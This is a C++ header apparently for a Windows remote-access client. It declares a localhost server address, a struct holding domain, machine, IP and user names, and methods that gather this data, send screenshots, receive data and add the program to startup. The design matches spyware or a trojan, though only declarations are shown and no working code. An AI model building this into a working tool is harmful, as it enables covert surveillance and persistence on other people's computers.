#pragma once
#include <winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <stdexcept>
#include <string>
#include <thread>
#include <vector>
#include <fstream>
#include <WinGDI.h>
#include <objbase.h>
#include <atlimage.h>

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 8080

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

struct Data
{
	std::string domain;
	std::string machine;
	std::string ip;
	std::string user;
};

class Client
{
public:
	Client();
	~Client();


private:
	static WSADATA wsaData;
	static SOCKET clientSocket;
	static sockaddr_in serverAddr;

	Data data;
	void getData();
	void sendData();
	void recieveData();
	void sendScreenshot();
	void addToStartup();
};